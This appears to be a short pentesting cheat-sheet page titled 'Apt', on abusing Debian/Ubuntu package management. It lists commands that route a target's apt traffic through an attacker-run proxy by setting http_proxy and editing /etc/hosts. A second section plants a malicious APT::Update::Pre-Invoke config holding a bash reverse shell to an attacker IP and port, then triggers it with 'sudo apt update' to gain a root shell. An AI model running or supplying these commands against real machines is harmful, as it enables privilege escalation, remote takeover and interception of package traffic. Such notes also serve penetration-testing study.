---
title: "Apt"
date: 2025-7-25
tags: ["Mitm", "Mitmproxy", "Apt", "Sudo", "Ubuntu", "Debian", "Package Management"]
---

### MITM (Man-in-the-Middle)

#### 1. Add Proxy Path in Target Machine

```console
export http_proxy=http://<LOCAL_IP>:<LOCAL_PROXY_PORT>
```

#### 2. Start Proxy in Local Machine

```console
# Tool
pip3 install --upgrade proxy.py
```

```console
# Start a proxy server
proxy --hostname 0.0.0.0 --port <LOCAL_PROXY_PORT>
```

#### 3. Redirect Traffic to Our Server

```console
# Edit /etc/hosts in target machine
<LOCAL_IP> apt.update.example.com
```

---

### SUDO

#### 1. Create a Malicious Config

```console
echo 'APT::Update::Pre-Invoke {"bash -c '\''bash -i >& /dev/tcp/<LOCAL_IP>/<LOCAL_PORT> 0>&1'\''"}' > /etc/apt/apt.conf.d/evil
```

#### 2. Exploit

```console
sudo apt update -y
```

<br>